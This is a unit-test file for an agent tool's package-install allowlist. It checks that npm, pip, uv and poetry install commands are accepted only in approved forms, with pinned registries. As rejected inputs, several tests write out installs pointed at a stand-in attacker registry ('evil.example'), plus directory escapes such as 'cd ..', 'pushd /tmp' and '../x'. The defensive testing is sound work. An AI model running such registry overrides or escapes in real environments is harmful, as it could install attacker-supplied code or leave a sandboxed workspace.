"""Unit tests for cloud-controlled package install allowlist (package_install)."""

from __future__ import annotations

import pytest

from agentcore.tools.builtin.package_install import (
    apply_working_directory,
    command_payload_argvs,
    install_prefix_allowed,
    is_install_shaped_argv,
    is_safe_relpath,
    registry_pin_env,
    reject_registry_override_argv,
    reject_registry_override_in_command,
    reject_workspace_cd,
    resolve_install_argv,
    validate_install_argv,
)


@pytest.mark.parametrize(
    "argv",
    [
        ["npm", "install"],
        ["npm", "ci"],
        ["pnpm", "install", "--frozen-lockfile"],
        ["yarn", "install"],
        ["npm", "--prefix", "apps/web", "install"],
        ["pnpm", "--dir", "pkg", "ci"],
        ["yarn", "--cwd", "frontend", "install"],
        ["pip", "install", "-r", "requirements.txt"],
        ["pip", "install", "."],
        ["python", "-m", "pip", "install", "-r", "requirements.txt"],
        ["python3", "-m", "pip", "install", "."],
        ["uv", "sync"],
        ["uv", "add", "requests"],
        ["uv", "pip", "install", "requests"],
        ["uv", "--directory", "apps/api", "sync"],
        ["poetry", "install"],
        ["poetry", "add", "httpx"],
        ["poetry", "--directory", "svc", "install"],
    ],
)
def test_install_shaped_accepted(argv: list[str]):
    assert is_install_shaped_argv(argv) is True
    assert install_prefix_allowed(argv) is True
    assert validate_install_argv(argv) is None


@pytest.mark.parametrize(
    "argv",
    [
        ["npm", "run", "build"],
        ["npm", "test"],
        ["bash", "-c", "npm install"],
        ["npm", "--prefix", "../x", "install"],
        ["uv", "run", "pytest"],
        ["pip", "list"],
        ["poetry", "run", "pytest"],
        ["uv", "--directory", "../x", "sync"],
    ],
)
def test_install_shaped_rejected(argv: list[str]):
    assert validate_install_argv(argv) is not None or not install_prefix_allowed(argv)


def test_shell_segments_allow_cd_pipe_and_redirect():
    assert command_payload_argvs("cd foo && npm install") == [["npm", "install"]]
    assert command_payload_argvs("cd foo && pip install -r requirements.txt") == [
        ["pip", "install", "-r", "requirements.txt"]
    ]
    assert command_payload_argvs("npm install") == [["npm", "install"]]
    assert command_payload_argvs("uv sync") == [["uv", "sync"]]
    assert command_payload_argvs("pnpm add vitest | tail") == [["pnpm", "add", "vitest"]]
    assert command_payload_argvs("pnpm add lodash 2>&1") == [["pnpm", "add", "lodash"]]
    assert command_payload_argvs("pnpm install > log.txt") == [["pnpm", "install"]]
    assert command_payload_argvs("pnpm add foo@>=1.0.0") == [["pnpm", "add", "foo@>=1.0.0"]]
    assert command_payload_argvs("pnpm test | grep FAIL") == [["pnpm", "test"]]
    assert command_payload_argvs("export FOO=1 && pnpm test") == [["pnpm", "test"]]
    assert command_payload_argvs("CI=1 pnpm test") == [["pnpm", "test"]]
    assert command_payload_argvs("pnpm test && echo hi") == [
        ["pnpm", "test"],
        ["echo", "hi"],
    ]


def test_workspace_cd_and_registry_in_command():
    assert reject_workspace_cd("cd foo && npm install") is None
    assert reject_workspace_cd("cd ..") is not None
    assert reject_workspace_cd("cd .. && pnpm test") is not None
    assert reject_workspace_cd("cd /") is not None
    assert reject_workspace_cd("cd ~") is not None
    assert reject_workspace_cd("pushd /tmp") is not None
    assert reject_workspace_cd("pnpm test") is None
    assert reject_registry_override_in_command(
        "npm install --registry https://evil.example/"
    )
    assert reject_registry_override_in_command("uv sync --index-url https://evil/")
    assert reject_registry_override_in_command("pnpm add lodash") is None


def test_reject_registry_override():
    err = reject_registry_override_argv(
        ["npm", "install", "--registry", "https://evil.example/"]
    )
    assert err is not None
    assert "包装源" in err
    assert (
        reject_registry_override_argv(["npm", "install", "--registry=https://evil/"])
        is not None
    )
    assert reject_registry_override_argv(["npm", "install"]) is None


def test_reject_python_index_override():
    assert (
        reject_registry_override_argv(
            ["pip", "install", "-i", "https://evil.example/simple/"]
        )
        is not None
    )
    assert (
        reject_registry_override_argv(
            ["pip", "install", "--index-url", "https://evil.example/simple/"]
        )
        is not None
    )
    assert (
        reject_registry_override_argv(
            ["uv", "sync", "--index-url=https://evil.example/simple/"]
        )
        is not None
    )
    assert (
        reject_registry_override_argv(
            ["uv", "pip", "install", "--extra-index-url", "https://evil/"]
        )
        is not None
    )
    assert (
        reject_registry_override_argv(
            ["poetry", "install", "--source", "evil"]
        )
        is not None
    )
    assert reject_registry_override_argv(["pip", "install", "-r", "requirements.txt"]) is None
    assert reject_registry_override_argv(["uv", "sync"]) is None


def test_safe_relpath():
    assert is_safe_relpath("apps/web") is True
    assert is_safe_relpath(".") is True
    assert is_safe_relpath("../x") is False
    assert is_safe_relpath("/etc") is False
    assert is_safe_relpath("C:\\Windows") is False


def test_resolve_and_apply_working_directory():
    assert resolve_install_argv(package_managers=["pnpm"]) == ["pnpm", "install"]
    assert resolve_install_argv(
        package_managers=["npm"], working_directory="apps/web"
    ) == ["npm", "--prefix", "apps/web", "install"]
    assert apply_working_directory(["npm", "install"], "apps/web") == [
        "npm",
        "--prefix",
        "apps/web",
        "install",
    ]


def test_resolve_pure_python_does_not_default_to_npm():
    assert resolve_install_argv(package_managers=["uv"]) == ["uv", "sync"]
    assert resolve_install_argv(package_managers=["poetry"]) == ["poetry", "install"]
    assert resolve_install_argv(package_managers=["pip"]) == [
        "pip",
        "install",
        "-r",
        "requirements.txt",
    ]
    assert resolve_install_argv(
        package_managers=["uv"], working_directory="apps/api"
    ) == ["uv", "--directory", "apps/api", "sync"]
    assert resolve_install_argv(
        package_managers=["pip"], working_directory="backend"
    ) == ["pip", "install", "-r", "backend/requirements.txt"]
    # Mixed JS+Python keeps JS-first (monorepo root).
    assert resolve_install_argv(package_managers=["uv", "pnpm"]) == ["pnpm", "install"]
    # Empty / unknown still defaults to npm (legacy).
    assert resolve_install_argv(package_managers=[]) == ["npm", "install"]


def test_apply_working_directory_python():
    assert apply_working_directory(["uv", "sync"], "apps/api") == [
        "uv",
        "--directory",
        "apps/api",
        "sync",
    ]
    assert apply_working_directory(
        ["pip", "install", "-r", "requirements.txt"], "backend"
    ) == ["pip", "install", "-r", "backend/requirements.txt"]
    assert apply_working_directory(
        ["python", "-m", "pip", "install", "-r", "requirements.txt"], "svc"
    ) == ["python", "-m", "pip", "install", "-r", "svc/requirements.txt"]


def test_registry_pin_env_points_at_allowlist():
    env = registry_pin_env()
    assert "registry.npmjs.org" in env["NPM_CONFIG_REGISTRY"]
    assert "pypi.org" in env["PIP_INDEX_URL"]
    assert env["UV_INDEX_URL"] == env["PIP_INDEX_URL"]
    assert "pypi.org" in env["POETRY_PYPI_MIRROR_URL"]


def test_install_cache_env_points_at_pkg_cache():
    from agentcore.tools.builtin.package_install import install_cache_env

    env = install_cache_env()
    assert env["NPM_CONFIG_CACHE"] == "/pkg-cache/npm"
    assert env["PNPM_STORE_PATH"] == "/pkg-cache/pnpm"
    assert env["PIP_CACHE_DIR"] == "/pkg-cache/pip"
    assert env["UV_CACHE_DIR"] == "/pkg-cache/uv"
    assert env["POETRY_CACHE_DIR"] == "/pkg-cache/poetry"
